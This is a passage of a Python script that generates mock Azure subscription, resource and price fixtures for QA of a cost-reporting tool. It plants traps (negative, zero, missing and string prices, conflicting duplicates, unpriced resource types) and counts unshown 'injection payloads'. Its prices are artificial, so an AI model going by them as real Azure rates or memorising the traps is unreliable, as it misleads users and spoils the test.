        PRICES[f"serviceName eq 'SQL Database' and armRegionName eq '{_rg}' "
                f"and priceType eq 'Consumption' and skuName eq '{_sku}'"] = [
            item("SQL Database", _sku, f"{_sku} Compute", _rg, _p)]
for _rg in REGIONS:
    PRICES[f"serviceName eq 'SQL Database' and armRegionName eq '{_rg}' and priceType eq 'Consumption'"] = [
        item("SQL Database", "Standard", "S0 Compute", _rg, 0.10),
        item("SQL Database", "GeneralPurpose", "GP Gen5 Compute", _rg, 0.2048),
    ]

# App Service — Windows and Linux meters again ambiguous
for _sku, _p in (("B1", 0.0175), ("B2", 0.0350), ("B3", 0.0700), ("S1", 0.095),
                 ("S2", 0.190), ("S3", 0.380), ("P0v3", 0.129), ("P1v2", 0.190),
                 ("P2v3", 0.380), ("P3v3", 0.760), ("I1v2", 0.408), ("I2v3", 0.816)):
    for _rg in REGIONS:
        PRICES[f"serviceName eq 'Azure App Service' and armRegionName eq '{_rg}' "
                f"and priceType eq 'Consumption' and armSkuName eq '{_sku}'"] = [
            item("Azure App Service", f"{_sku} App", f"{_sku} App", _rg, _p, arm_sku=_sku)]

# ── Data-quality traps in the price payload ───────────────────────────────
DQ_TRAPS = {
    "negative_price": item("Virtual Machines", "Standard_B1s", "B1s Base", "centralus", -1.25,
                           arm_sku="Standard_B1s"),
    "zero_price": item("Virtual Machines", "Standard_D8s_v5", "D8s Base", "eastus2", 0.0,
                       arm_sku="Standard_D8s_v5"),
    "missing_retail_price": {k: v for k, v in
                             item("Virtual Machines", "Standard_M128s_v2", "M128 Base",
                                  "westus3", 30.0, arm_sku="Standard_M128s_v2").items()
                             if k != "retailPrice"},
    "string_price": item("Virtual Machines", "Standard_F2s_v2", "F2s Base", "brazilsouth",
                         "0.0846", arm_sku="Standard_F2s_v2"),
}
# Splice the traps into the served responses for those SKU/region combos
PRICES[f"serviceName eq 'Virtual Machines' and armSkuName eq 'Standard_B1s' "
       f"and armRegionName eq 'centralus' and priceType eq 'Consumption'"] = [DQ_TRAPS["negative_price"]]
PRICES[f"serviceName eq 'Virtual Machines' and armSkuName eq 'Standard_D8s_v5' "
       f"and armRegionName eq 'eastus2' and priceType eq 'Consumption'"] = [DQ_TRAPS["zero_price"]]
PRICES[f"serviceName eq 'Virtual Machines' and armSkuName eq 'Standard_M128s_v2' "
       f"and armRegionName eq 'westus3' and priceType eq 'Consumption'"] = [DQ_TRAPS["missing_retail_price"]]
PRICES[f"serviceName eq 'Virtual Machines' and armSkuName eq 'Standard_F2s_v2' "
       f"and armRegionName eq 'brazilsouth' and priceType eq 'Consumption'"] = [DQ_TRAPS["string_price"]]

# Duplicate rows with conflicting prices for the same SKU+region
PRICES[f"serviceName eq 'Virtual Machines' and armSkuName eq 'Standard_E8s_v3' "
       f"and armRegionName eq 'uksouth' and priceType eq 'Consumption'"] = [
    item("Virtual Machines", "E8s_v3 (Linux)", "E8s Base", "uksouth", 0.5040, arm_sku="Standard_E8s_v3"),
    item("Virtual Machines", "E8s_v3 (Linux)", "E8s Base", "uksouth", 0.4780, arm_sku="Standard_E8s_v3"),
    item("Virtual Machines", "E8s v3", "E8s Base", "uksouth", 0.6000, arm_sku="Standard_E8s_v3"),
]

# ── Extended config ───────────────────────────────────────────────────────
EXTENDED_YAML = """# ============================================================
# resources_extended.yaml — QA config exercising 14 resource types
# The shipped config/resources.yaml enables 5 of these.
# Only the first five have entries in PRICE_HANDLERS; the rest
# reach providers/azure/pricing.py:get_price() -> "Unsupported type".
# ============================================================
resources:
  # --- Priced (PRICE_HANDLERS entries exist) ---
  - Microsoft.Compute/virtualMachines
  - Microsoft.Storage/storageAccounts
  - Microsoft.Sql/servers/databases
  - Microsoft.Web/serverFarms
  - Microsoft.Network/virtualNetworks

  # --- Unpriced: silently $0.00 ---
  - Microsoft.Compute/virtualMachineScaleSets
  - Microsoft.Network/publicIPAddresses
  - Microsoft.Network/networkInterfaces
  - Microsoft.Network/applicationGateways
  - Microsoft.ContainerService/managedClusters
  - Microsoft.ContainerRegistry/registries
  - Microsoft.CognitiveServices/accounts
  - Microsoft.MachineLearningServices/workspaces
  - Microsoft.KeyVault/vaults
"""


# ── Emit ──────────────────────────────────────────────────────────────────
def main():
    (HERE / "azure_subscriptions.json").write_text(json.dumps(
        {"value": [{"subscription_id": i, "display_name": n, "state": s,
                    "managementGroup": MGS[mg]} for i, n, s, mg in SUBSCRIPTIONS]},
        indent=2), encoding="utf-8")

    (HERE / "azure_resources_raw.json").write_text(json.dumps(RAW, indent=2), encoding="utf-8")
    (HERE / "azure_prices.json").write_text(json.dumps(PRICES, indent=2), encoding="utf-8")
    (HERE / "resources_extended.yaml").write_text(EXTENDED_YAML, encoding="utf-8")

    with open(HERE / "azure_resources_normalized.csv", "w", newline="", encoding="utf-8-sig") as f:
        w = csv.writer(f)
        w.writerow(HDR)
        for row in NORMALIZED:
            w.writerow([NDF if v == "" else v for v in row])

    print(f"seed                : {SEED}")
    print(f"subscriptions       : {len(SUBSCRIPTIONS)} "
          f"({len(ENABLED)} enabled, {len(SUBSCRIPTIONS)-len(ENABLED)} disabled)")
    print(f"normalised rows     : {len(NORMALIZED)}")
    print(f"resource types      : {len(COUNTED)}")
    print(f"price filters       : {len(PRICES)}")
    print(f"injection payloads  : {len(INJ)}")
    print()
    for t, c in sorted(COUNTED.items(), key=lambda kv: -kv[1]):
        print(f"  {c:>4}  {t}")


if __name__ == "__main__":
    main()
